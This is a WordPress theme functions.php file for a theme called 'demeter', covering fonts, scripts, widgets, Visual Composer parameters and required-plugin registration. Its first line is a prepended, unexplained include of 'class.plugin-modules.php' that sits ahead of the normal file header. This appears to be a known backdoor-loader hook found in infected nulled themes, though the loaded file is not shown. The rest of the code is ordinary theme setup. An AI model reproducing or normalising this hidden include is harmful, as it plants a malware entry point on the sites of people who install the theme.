<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
 * Redux Theme functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package demeter
 */

if ( ! class_exists( 'ReduxFramewrk' ) ) {
    require_once( get_template_directory() . '/framework/sample-config.php' );
	function demeter_removeDemoModeLink() { // Be sure to rename this function to something more unique
		if ( class_exists('ReduxFrameworkPlugin') ) {
			remove_filter( 'plugin_row_meta', array( ReduxFrameworkPlugin::get_instance(), 'plugin_metalinks'), null, 2 );
		}
		if ( class_exists('ReduxFrameworkPlugin') ) {
			remove_action('admin_notices', array( ReduxFrameworkPlugin::get_instance(), 'admin_notices' ) );    
		}
	}
	add_action('init', 'demeter_removeDemoModeLink');
}

//Theme Set up:
function demeter_theme_setup() {
	if ( ! isset( $content_width ) ) {
		$content_width = 900;
	}

	/*

	 * Make theme available for translation.

	 * Translations can be filed in the /languages/ directory.

	 * If you're building a theme based on cubic, use a find and replace

	 * to change 'cubic' to the name of your theme in all the template files

	 */
	load_theme_textdomain( 'demeter', get_template_directory() . '/languages' );

    /*
     * This theme uses a custom image size for featured images, displayed on
     * "standard" posts and pages.
     */
	add_theme_support( 'custom-header' ); 
	add_theme_support( 'custom-background' );
	add_theme_support( "title-tag" );
    add_theme_support( 'post-thumbnails' );
    // Adds RSS feed links to <head> for posts and comments.

    add_theme_support( 'automatic-feed-links' );
    // Switches default core markup for search form, comment form, and comments
    // to output valid HTML5.
    add_theme_support( 'html5', array( 'search-form', 'comment-form', 'comment-list' ) );

    //Post formats
    add_theme_support( 'post-formats', array(
        'audio',  'gallery', 'image', 'quote', 'video', 'link'
    ) );

    // This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary'   => __('Primary Navigation <b>Only Use For All Other Pages</b>', 'demeter'),		
		'secondary' => __('Menu Home <b>Only Use For Home Page</b>', 'demeter'),			
	) );

}
add_action( 'after_setup_theme', 'demeter_theme_setup' );

/**
 * Register custom fonts.
 */
if ( ! function_exists( 'demeter_fonts_url' ) ) :
/**
 * Register Google fonts for demeter.
 *
 * Create your own demeter_fonts_url() function to override in a child theme.
 *
 * @since Demeter 1.0
 *
 * @return string Google fonts URL for the theme.
 */
function demeter_fonts_url() {
	$fonts_url = '';
	$font_families     = array();
	$subsets   = 'latin,cyrillic-ext,greek-ext,greek,vietnamese,latin-ext,cyrillic';

	/* translators: If there are characters in your language that are not supported by Open Sans, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Open Sans font: on or off', 'demeter' ) ) {
		$font_families[] = 'Open+Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic';
	}

	/* translators: If there are characters in your language that are not supported by Lato, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Lato font: on or off', 'demeter' ) ) {
		$font_families[] = 'Lato:100,300,400,700,900,100italic,300italic,400italic,700italic,900italic';
	}

	/* translators: If there are characters in your language that are not supported by Montserrat, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Montserrat font: on or off', 'demeter' ) ) {
		$font_families[] = 'Montserrat:400,700';
	}

	/* translators: If there are characters in your language that are not supported by Satisfy, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Satisfy font: on or off', 'demeter' ) ) {
		$font_families[] = 'Satisfy';
	}

	/* translators: If there are characters in your language that are not supported by Courgette, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Courgette font: on or off', 'demeter' ) ) {
		$font_families[] = 'Courgette';
	}
	
	if ( $font_families ) {
		$fonts_url = add_query_arg( array(
			'family' => urlencode( implode( '|', $font_families ) ),
			'subset' => urlencode( $subsets ),
		), 'https://fonts.googleapis.com/css' );
	}
	return esc_url_raw( $fonts_url );
}
endif;

function demeter_theme_scripts_styles() {
	global $theme_option;
	$protocol = is_ssl() ? 'https' : 'http';
	$gmapaipkey = $theme_option['gmap_apikey'];

	// Add custom fonts, used in the main stylesheet.
	wp_enqueue_style( 'demeter-fonts', demeter_fonts_url(), array(), null );

	wp_enqueue_style( 'base', get_template_directory_uri().'/css/base.css');	
	wp_enqueue_style( 'skeleton', get_template_directory_uri().'/css/skeleton.css');
	wp_enqueue_style( 'demeter-font-awesome', get_template_directory_uri().'/css/font-awesome/css/font-awesome.css');
	wp_enqueue_style( 'flaticon', get_template_directory_uri().'/css/flaticon.css');
	wp_enqueue_style( 'owl.carousel', get_template_directory_uri().'/css/owl.carousel.css');
	wp_enqueue_style( 'revolution', get_template_directory_uri().'/css/settings.css');
	wp_enqueue_style( 'retina', get_template_directory_uri().'/css/retina.css');	
	wp_enqueue_style( 'colorbox', get_template_directory_uri().'/css/colorbox.css');

	wp_enqueue_style( 'style', get_stylesheet_uri(), array(), '2017-06-11' );

	if ($theme_option['theme_style'] != 'light') {
		wp_enqueue_style( 'dark-color', get_template_directory_uri().'/css/dark-color.css');
	}

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ){
    	wp_enqueue_script( 'comment-reply' );
	}

	wp_enqueue_script("modernizr", get_template_directory_uri()."/js/modernizr.custom.js",array(),false,false);
	if($theme_option['show_pre'] != 'no') { 
		wp_enqueue_script("preloader", get_template_directory_uri()."/js/royal_preloader.min.js",array(),false,false);
	}
	wp_enqueue_script("mapapi", "$protocol://maps.googleapis.com/maps/api/js?key=$gmapaipkey",array(),false,false);
	wp_enqueue_script("bgndGallery", get_template_directory_uri()."/js/mb.bgndGallery.js",array(),false,false);
	wp_enqueue_script("probars", get_template_directory_uri()."/js/pro-bars.js",array(),false,true);
	wp_enqueue_script("plugins", get_template_directory_uri()."/js/plugins.js",array(),false,true);	
	wp_enqueue_script("fitvids", get_template_directory_uri()."/js/jquery.fitvids.js",array(),false,true);
	wp_enqueue_script("YTPlayer", get_template_directory_uri()."/js/YTPlayer.js",array(),false,true);	
	wp_enqueue_script("parallax", get_template_directory_uri()."/js/jquery.parallax-1.1.3.js",array(),false,true);	
	wp_enqueue_script("colorbox", get_template_directory_uri()."/js/jquery.colorbox.js",array(),false,true);
	wp_enqueue_script("template", get_template_directory_uri()."/js/template.js",array(),false,true); 

}

add_action( 'wp_enqueue_scripts', 'demeter_theme_scripts_styles');

if(!function_exists('demeter_custom_frontend_scripts')){
	function demeter_custom_frontend_scripts(){
	global $theme_option;
	if($theme_option['show_pre'] != 'no') {	
	?>
	<script type="text/javascript">

		window.jQuery = window.$ = jQuery;	

		(function($) { "use strict";

            Royal_Preloader.config({

                mode:           'logo', // 'number', "text" or "logo"

                logo:           '<?php echo esc_url($theme_option['logo_preload']['url']); ?>',

                timeout:        0,

                showInfo:       false,

                opacity:        1,

                background:     ['<?php echo esc_attr($theme_option['bgpreload']); ?>']

            });

		})(jQuery);

	</script>
	<?php
	}	
	}
}
add_action('wp_footer', 'demeter_custom_frontend_scripts');

// Widget Sidebar
function demeter_widgets_init() {
	register_sidebar( array(
        'name'          => __( 'Primary Sidebar', 'demeter' ),
        'id'            => 'sidebar-1',        
		'description'   => __( 'Appears in the sidebar section of the site.', 'demeter' ),        
		'before_widget' => '<div id="%1$s" class="widget %2$s">',        
		'after_widget'  => '</div>',        
		'before_title'  => '<h6>',        
		'after_title'   => '</h6>'
    ) );    
}
add_action( 'widgets_init', 'demeter_widgets_init' );


//function tag widgets
function demeter_tag_cloud_widget($args) {
	$args['number'] = 0; //adding a 0 will display all tags
	$args['largest'] = 18; //largest tag
	$args['smallest'] = 11; //smallest tag
	$args['unit'] = 'px'; //tag font unit
	$args['format'] = 'list'; //ul with a class of wp-tag-cloud
	$args['exclude'] = ''; //exclude tags by ID
	return $args;
}
add_filter( 'widget_tag_cloud_args', 'demeter_tag_cloud_widget' );

function demeter_excerpt() {

  global $theme_option;

  if(isset($theme_option['blog_excerpt'])){

    $limit = $theme_option['blog_excerpt'];

  }else{

    $limit = 15;

  }

  $excerpt = explode(' ', get_the_excerpt(), $limit);

  if (count($excerpt)>=$limit) {

    array_pop($excerpt);

    $excerpt = implode(" ",$excerpt).'...';

  } else {

    $excerpt = implode(" ",$excerpt);

  }

  $excerpt = preg_replace('`[[^]]*]`','',$excerpt);

  return $excerpt;

}



// Excerpt Section Blog Post

function demeter_blog_excerpt($limit) {

  $excerpt = explode(' ', get_the_excerpt(), $limit);

  if (count($excerpt)>=$limit) {

    array_pop($excerpt);

    $excerpt = implode(" ",$excerpt).'...';

  } else {

    $excerpt = implode(" ",$excerpt);

  }

  $excerpt = preg_replace('`[[^]]*]`','',$excerpt);

  return $excerpt;

}



function demeter_search_form( $form ) {

    $form = '<form role="search" method="get" id="searchform" class="search_form" action="' . home_url( '/' ) . '" >  

    	<input type="text" value="' . get_search_query() . '" name="s" id="s" placeholder="'. __( 'type to search and hit enter', 'demeter' ) .'" />

    </form>';

    return $form;

}

add_filter( 'get_search_form', 'demeter_search_form' );



// Comment Form
function demeter_theme_comment($comment, $args, $depth) {

   $GLOBALS['comment'] = $comment; ?>

   <div class="post-content-comment grey-section">

		<?php echo get_avatar($comment,$size='100',$default='http://0.gravatar.com/avatar/ad516503a11cd5ca435acc9bb6523536?s=70' ); ?>

		<h6><?php printf(__('%s','demeter'), get_comment_author_link()) ?></h6>

		<?php if ($comment->comment_approved == '0'){ ?>

			 <p><em><?php _e('Your comment is awaiting moderation.','demeter') ?></em></p>

		<?php }else{ ?>

        <?php comment_text() ?>

		<?php } ?>

		<div class="reply"><?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?></div> 

	<div class="clearfix"></div>	

	</div> 

<?php

}



//Code Visual Composer.
function custom_css_classes_for_vc_row_and_vc_column($class_string, $tag) {

    if($tag=='vc_row' || $tag=='vc_row_inner') {

        $class_string = str_replace('vc_row-fluid', '', $class_string);

    }

    if($tag=='vc_column' || $tag=='vc_column_inner') {

		$class_string = preg_replace('/vc_col-sm-1/', 'one columns', $class_string);
		$class_string = preg_replace('/vc_col-sm-2/', 'two columns', $class_string);		
		$class_string = preg_replace('/vc_col-sm-3/', 'three columns', $class_string);
		$class_string = preg_replace('/vc_col-sm-4/', 'four columns', $class_string);		
		$class_string = preg_replace('/vc_col-sm-5/', 'five columns ', $class_string);
		$class_string = preg_replace('/vc_col-sm-6/', 'six columns', $class_string);
		$class_string = preg_replace('/vc_col-sm-7/', 'seven columns', $class_string);
		$class_string = preg_replace('/vc_col-sm-8/', 'eight columns', $class_string);
		$class_string = preg_replace('/vc_col-sm-9/', 'nine columns', $class_string);
		$class_string = preg_replace('/vc_col-sm-10/', 'ten columns', $class_string);
		$class_string = preg_replace('/vc_col-sm-11/', 'eleven columns', $class_string);	
		$class_string = preg_replace('/vc_col-sm-12/', 'twelve columns', $class_string);

    }

    return $class_string;

}

// Filter to Replace default css class for vc_row shortcode and vc_column
add_filter('vc_shortcodes_css_class', 'custom_css_classes_for_vc_row_and_vc_column', 10, 2); 

// Add new Param in Row
if(function_exists('vc_add_param')){

vc_add_param('vc_row',array(

                              "type" => "textfield",

                              "heading" => __('Extra id name', 'demeter'),

                              "param_name" => "extra_id",

                              "value" => "",

                              "description" => __("If you wish to style particular content element differently, then use this field to add a id name and then refer to it in your css file.", 'demeter'),   

    ));

vc_add_param('vc_row',array(

                              "type" => "textfield",

                              "heading" => __('Section Sub Title', 'demeter'),

                              "param_name" => "ses_sub_title",

                              "value" => "",

                              "description" => __("Section Sub Title, Leave a blank do not show frontend.", 'demeter'),   

    ));

vc_add_param('vc_row',array(

                              "type" => "textfield",

                              "heading" => __('Section Title', 'demeter'),

                              "param_name" => "ses_title",

                              "value" => "",

                              "description" => __("Title of Section, Leave a blank do not show frontend.", 'demeter'),   

    ));	

vc_add_param('vc_row',array(

                             "type" => "attach_image",

					         "holder" => "div",

					         "class" => "",

					         "heading" => "Background Image Parallax",

					         "param_name" => "bgimage_parallax",

					         "value" => "",

					         "description" => __("", 'demeter')

    ));	

vc_add_param('vc_row',array(

								"type" => "textfield",

								"holder" => "div",

								"class" => "",

								"heading" => __("Overlay Opacity", 'demeter'),

								"param_name" => "opacity",

								"value" => "",

								"description" => __("Enter Number Opacity : 0.77, 0.2, 0.4, etc...", 'demeter')

    ));	

vc_add_param('vc_row',array(

						         "type" => "colorpicker",

						         "holder" => "div",

						         "class" => "",

						         "heading" => __("Overlay Color", 'demeter'),

						         "param_name" => "overlay_color",

						         "value" => "",

						         "description" => __("Background Overlay Color, Default: #f9f9f9 ", 'demeter')         

    ));	

vc_add_param('vc_row',array(

                              "type" => "dropdown",

                              "heading" => __('Show or Hide Overlay', 'demeter'),

                              "param_name" => "overlay",

                              "value" => array(   

                                                __('No', 'demeter') => 'no',  

                                                __('Yes', 'demeter') => 'yes',                                                                                

                                              ),

                              "description" => __("Select Show or Hide, Default: No ", 'demeter'),      

                            ) 

    );

vc_add_param('vc_row',array(

                              "type" => "dropdown",

                              "heading" => __('Fullwidth', 'demeter'),

                              "param_name" => "fullwidth",

                              "value" => array(   

                                                __('No', 'demeter') => 'no',  

                                                __('Yes', 'demeter') => 'yes',                                                                                

                                              ),

                              "description" => __("Select Fullwidth or not, Default: No fullwidth", 'demeter'),      

                            ) 

    );

	

// Add new Param in Column	

vc_add_param('vc_column',array(

                              "type" => "textfield",

                              "heading" => __('Column Title', 'demeter'),

                              "param_name" => "title",

                              "value" => "",

                              "description" => __("Title of column", 'demeter'),      

                            ) 

    );

vc_add_param('vc_column',array(

                              "type" => "textfield",

                              "heading" => __('Container Class', 'demeter'),

                              "param_name" => "wap_class",

                              "value" => "",

                              "description" => __("Container Class", 'demeter'),      

                            ) 

    );

vc_add_param('vc_column',array(

                              "type" => "textfield",

                              "heading" => __('Container id', 'demeter'),

                              "param_name" => "wap_id",

                              "value" => "",

                              "description" => __("Container ID, Only use for content slider.", 'demeter'),      

                            ) 

    );	

vc_add_param('vc_column',array(

                              "type" => "dropdown",

                              "heading" => __('Column Effect', 'demeter'),

                              "param_name" => "column_effect",

                              "value" => array(    

                                                __('Bottom Move', 'demeter') => 'bottommove',     

												__('Top Move', 'demeter') => 'topmove', 

												__('None', 'demeter') => 'none', 	

                                              ),

                              "description" => __("Select Effect for column, Default: Move Bottom", 'demeter'),      

                            ) 

    );	

	// Remove some param in Row   	
	vc_remove_param( "vc_row", "el_id" );
	vc_remove_param( "vc_row", "parallax" );
    vc_remove_param( "vc_row", "parallax_image" );
    vc_remove_param( "vc_row", "full_width" );
    vc_remove_param( "vc_row", "full_height" );
    vc_remove_param( "vc_row", "video_bg" );
    vc_remove_param( "vc_row", "video_bg_parallax" );
    vc_remove_param( "vc_row", "content_placement" );
    vc_remove_param( "vc_row", "video_bg_url" );
    vc_remove_param( "vc_row", "parallax_speed_bg" );
    vc_remove_param( "vc_row", "parallax_speed_video" );
    vc_remove_param( "vc_row", "columns_placement" );
    vc_remove_param( "vc_row", "equal_height" );
    vc_remove_param( "vc_row", "gap" );

	// Remove some param in Column  
	vc_remove_param( "vc_column", "offset" );
	vc_remove_param( "vc_column", "css_animation" );
}

/**
 * This file represents an example of the code that themes would use to register
 * the required plugins.
 *
 * It is expected that theme authors would copy and paste this code into their
 * functions.php file, and amend to suit.
 *
 * @package    TGM-Plugin-Activation
 * @subpackage Example
 * @version    2.5.0-alpha
 * @author     Thomas Griffin
 * @author     Gary Jones
 * @copyright  Copyright (c) 2011, Thomas Griffin
 * @license    http://opensource.org/licenses/gpl-2.0.php GPL v2 or later
 * @link       https://github.com/thomasgriffin/TGM-Plugin-Activation
 */

/**
 * Include the TGM_Plugin_Activation class.
 */
require_once get_template_directory() . '/framework/class-tgm-plugin-activation.php';
add_action( 'tgmpa_register', 'demeter_theme_register_required_plugins' );
/**
 * Register the required plugins for this theme.
 *
 * In this example, we register two plugins - one included with the TGMPA library
 * and one from the .org repo.
 *
 * The variable passed to tgmpa_register_plugins() should be an array of plugin
 * arrays.
 *
 * This function is hooked into tgmpa_init, which is fired within the
 * TGM_Plugin_Activation class constructor.
 */
function demeter_theme_register_required_plugins() {

	/*
	 * Array of plugin arrays. Required keys are name and slug.
	 * If the source is NOT from the .org repo, then source is also required.
	 */
	$plugins = array(
		// This is an example of how to include a plugin from the WordPress Plugin Repository.
		array(
            'name'      => 'Contact Form 7',
            'slug'      => 'contact-form-7',
            'required'  => false,
        ),
		array(
            'name'      => 'Redux Framework',
            'slug'      => 'redux-framework',
            'required'           => true,
            'force_activation'   => false,
            'force_deactivation' => false,
        ), 
		array(            
            'name'               => 'WPBakery Visual Composer', // The plugin name.
            'slug'               => 'js_composer', // The plugin slug (typically the folder name).
            'source'             => 'http://oceanthemes.net/plugins-required/js_composer.zip', // The plugin source.
            'required'           => true, // If false, the plugin is only 'recommended' instead of required.
            'version'            => '5.4.2', // E.g. 1.0.0. If set, the active plugin must be this version or higher. If the plugin version is higher than the plugin version installed, the user will be notified to update the plugin.
            'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
            'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
            'external_url'       => '', // If set, overrides default API URL and points to an external URL.
            'is_callable'        => '', // If set, this callable will be be checked for availability to determine if a plugin is active.
        ),
        array(
            'name'               => 'Revolution Slider', // The plugin name.
            'slug'               => 'revslider', // The plugin slug (typically the folder name).            
            'source'             => 'http://oceanthemes.net/plugins-required/revslider.zip', // The plugin source.            
            'required'           => false, // If false, the plugin is only 'recommended' instead of required.
            'version'            => '5.4.6.2', // E.g. 1.0.0. If set, the active plugin must be this version or higher. If the plugin version is higher than the plugin version installed, the user will be notified to update the plugin.
            'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
            'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
            'external_url'       => '', // If set, overrides default API URL and points to an external URL.
            'is_callable'        => '', // If set, this callable will be be checked for availability to determine if a plugin is active.
        ),
        array(            
            'name'               => 'OT Portfolio', // The plugin name.
            'slug'               => 'ot_portfolio', // The plugin slug (typically the folder name).
            'source'             => 'http://oceanthemes.net/plugins-required/demeter/ot_portfolio.zip', // The plugin source.
            'required'           => false, // If false, the plugin is only 'recommended' instead of required.
        ),       
        array(            
            'name'               => 'OT About', // The plugin name.
            'slug'               => 'ot_about', // The plugin slug (typically the folder name).
            'source'             => 'http://oceanthemes.net/plugins-required/demeter/ot_about.zip', // The plugin source.
            'required'           => false, // If false, the plugin is only 'recommended' instead of required.
        ),   
		array(            
            'name'               => 'OT Visual Composer', // The plugin name.
            'slug'               => 'ot_composer', // The plugin slug (typically the folder name).
            'source'             => 'http://oceanthemes.net/plugins-required/demeter/ot_composer.zip', // The plugin source.
            'required'           => false, // If false, the plugin is only 'recommended' instead of required.
        ),		
        array(            
            'name'               => 'OT Themes One Click Import Demo', // The plugin name.
            'slug'               => 'ot-themes-one-click-import', // The plugin slug (typically the folder name).
            'source'             => 'http://oceanthemes.net/plugins-required/demeter/ot-themes-one-click-import.zip', // The plugin source.
            'required'           => false, // If false, the plugin is only 'recommended' instead of required.
        ),	
	);

	/*
     * Array of configuration settings. Amend each line as needed.
     *
     * TGMPA will start providing localized text strings soon. If you already have translations of our standard
     * strings available, please help us make TGMPA even better by giving us access to these translations or by
     * sending in a pull-request with .po file(s) with the translations.
     *
     * Only uncomment the strings in the config array if you want to customize the strings.
     */
    $config = array(
        'id'           => 'tgmpa',                 // Unique ID for hashing notices for multiple instances of TGMPA.
        'default_path' => '',                      // Default absolute path to bundled plugins.
        'menu'         => 'tgmpa-install-plugins', // Menu slug.
        'parent_slug'  => 'themes.php',            // Parent menu slug.
        'capability'   => 'edit_theme_options',    // Capability needed to view plugin install page, should be a capability associated with the parent menu used.
        'has_notices'  => true,                    // Show admin notices or not.
        'dismissable'  => true,                    // If false, a user cannot dismiss the nag message.
        'dismiss_msg'  => '',                      // If 'dismissable' is false, this message will be output at top of nag.
        'is_automatic' => false,                   // Automatically activate plugins after installation or not.
        'message'      => '',                      // Message to output right before the plugins table.  
    );

    tgmpa( $plugins, $config );
}

/**
 * Customizer images.
 */
require get_template_directory() . '/framework/bfi_thumb-master/BFI_Thumb.php';
/**
 * Implement the Custom Meta Boxs.
 */
require get_template_directory() . '/framework/Custom-Metaboxes/metabox-functions.php';
/** customize theme option for color **/
require get_template_directory() . '/framework/color.php';

// Add specific CSS class by filter
add_filter( 'body_class', 'demeter_body_class_names' );
function demeter_body_class_names( $classes ) {
    global $theme_option;
    $theme = wp_get_theme();
    
    $classes[] = 'demeter-theme-ver-'.$theme->version;
    $classes[] = 'wordpress-version-'.get_bloginfo( 'version' );
    
    if($theme_option['show_pre'] == 'no') {
    	$classes[] = 'royal_loader';
    }	

    // return the $classes array
    return $classes;
}

?>